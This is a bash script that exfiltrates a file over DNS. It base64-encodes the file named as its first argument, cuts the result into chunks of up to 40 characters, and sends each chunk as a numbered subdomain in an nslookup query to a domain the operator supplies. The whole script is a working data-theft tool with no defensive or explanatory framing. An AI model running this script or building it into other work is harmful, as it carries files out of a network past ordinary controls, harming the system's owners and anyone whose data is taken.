#!/bin/bash

FileToSend=$1
DNSToExfil=$2
CharsLimit=$3

if [ -z "${FileToSend}" ] && [ -z "${DNSToExfil}" ] && [ ${CharsLimit} -eq 0 ]; then
    echo "All parameters are empty. Please provide values for all parameters."
    exit 1
fi

if [ ${CharsLimit} -eq 0 ] || [ ${CharsLimit} -gt 40 ]; then
    echo "CharsLimit should be greater than 0 and less than or equal to 40."
    exit 1
fi

if [ -f "${FileToSend}" ]; then
    base64=$(base64 "${FileToSend}")
    partNumber=0
    for ((i=0; i<${#base64}; i+=${CharsLimit})); do
        partLength=$(($CharsLimit<${#base64}-$i?$CharsLimit:${#base64}-$i))
        part="${base64:i:partLength}"
        part=${part//=}
        partNumber=$(($partNumber+1))
        subdomain_exfiltration="part$partNumber-$part.$DNSToExfil"
        echo $subdomain_exfiltration
        nslookup $subdomain_exfiltration > /dev/null 2>&1
    done
else
    echo "The file $FileToSend does not exist."
    exit 1
fi
